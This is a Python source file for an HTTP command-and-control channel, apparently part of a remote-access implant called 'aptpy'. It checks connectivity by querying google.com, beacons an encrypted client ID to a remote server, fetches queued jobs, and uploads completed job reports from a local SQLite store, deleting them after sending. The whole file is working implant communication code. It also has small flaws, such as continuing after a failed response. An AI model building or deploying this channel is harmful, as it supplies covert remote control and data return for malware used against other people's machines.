import requests
import sqlite3
from abstract import AbstractChannel
from json import dumps, loads
from lib.encrypt import RSAencrypt, RSAdecrypt, AESencrypt, AESdecrypt
from logging import getLogger
from os.path import exists as file_exists


class HttpChannel(AbstractChannel):
    def __init__(self, client_id, queue_send, queue_recv, debug=False):
        super(HttpChannel, self).__init__(client_id, queue_send, queue_recv, debug)

        self._remote_host = 'http://localhost:8000/'

    def enabled(self):
        response = requests.get('https://www.google.com')

        return response.status_code == 200

    def connect(self):
        getLogger('aptpy').debug("[HTTP] Trying to contact the remote server")

        try:
            data = dumps({'task': 'ping', 'client_id': self.client_id})
            encrypted = RSAencrypt(data)
            cookies = {'XDEBUG_SESSION': 'PHPSTORM'} if self.debug else {}

            response = requests.put(self._remote_host,
                                    json=[encrypted['data'], encrypted['sign']],
                                    cookies=cookies
                                    )

            if response.status_code != 200:
                getLogger('aptpy').debug("[HTTP] We can't connect to the remote server")
                self._key = None

            getLogger('aptpy').debug("[HTTP] Got the key from the remote server")

            data = response.json()
            data = loads(RSAdecrypt(data[0], data[1]))
            self._key = data.pop()
        except requests.ConnectionError:
            getLogger('aptpy').debug("[HTTP] An error occurred while contacting the remote server")
            self._key = None

    def _send(self):
        getLogger('aptpy').debug("[HTTP] Trying to report completed jobs")

        reports = []
        ids = []

        # Init the db if it doesn't exist
        if not file_exists(self.db_file):
            self._create_db()

        conn = sqlite3.connect(self.db_file)
        cur = conn.cursor()

        for row in cur.execute("SELECT * FROM out LIMIT 5"):
            ids.append(str(row[0]))
            reports.append(row[1])

        # Nothing to report
        if not reports:
            conn.close()
            return

        try:
            data = dumps({'task': 'report_job', 'client_id': self.client_id, 'reports': reports})
            encrypted = RSAencrypt(data)
            cookies = {'XDEBUG_SESSION': 'PHPSTORM'} if self.debug else {}

            response = requests.post(self._remote_host,
                                     json=[encrypted['data'], encrypted['sign']],
                                     cookies=cookies
                                     )

            if response.status_code != 200:
                getLogger('aptpy').debug("[HTTP] We can't connect to the remote server")
                self._key = None
            else:
                if ids:
                    # Delete sent reports
                    cur.execute("DELETE FROM out WHERE id IN(%s)" % ",".join(ids))
                    conn.commit()

        except requests.ConnectionError:
            getLogger('aptpy').debug("[HTTP] An error occurred while contacting the remote server")
            self._key = None

        conn.close()

    def receive(self):
        getLogger('aptpy').debug("[HTTP] Trying to get new commands from the remote server")

        try:
            data = dumps({'task': 'get_job', 'client_id': self.client_id})
            encrypted = AESencrypt(data, self._key)
            cookies = {'XDEBUG_SESSION': 'PHPSTORM'} if self.debug else {}

            response = requests.post(self._remote_host,
                                     json=[encrypted['data'], encrypted['sign']],
                                     cookies=cookies
                                     )

            if response.status_code != 200:
                getLogger('aptpy').debug("[HTTP] We can't connect to the remote server")
                self._key = None
                return

            return response.json()

        except requests.ConnectionError:
            getLogger('aptpy').debug("[HTTP] An error occurred while contacting the remote server")
            self._key = None
